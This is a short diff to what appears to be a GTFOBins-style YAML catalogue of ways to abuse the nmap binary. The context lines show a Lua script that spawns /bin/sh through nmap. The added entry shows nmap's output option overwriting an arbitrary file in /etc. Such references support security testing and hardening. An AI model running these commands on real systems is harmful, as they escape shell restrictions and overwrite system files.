@@ -108,4 +108,9 @@ functions:
         TF=$(mktemp)
         echo 'os.execute("/bin/sh")' > $TF
         ./nmap --script=$TF
+    - description: This will over-write files with nmap output, use with caution.
+      code: |
+        sudo touch /etc/filecantbetouched
+        nmap 127.0.0.1 -oN=/etc/filecantbetouched
+        cat /etc/filecantbetouched
 ---
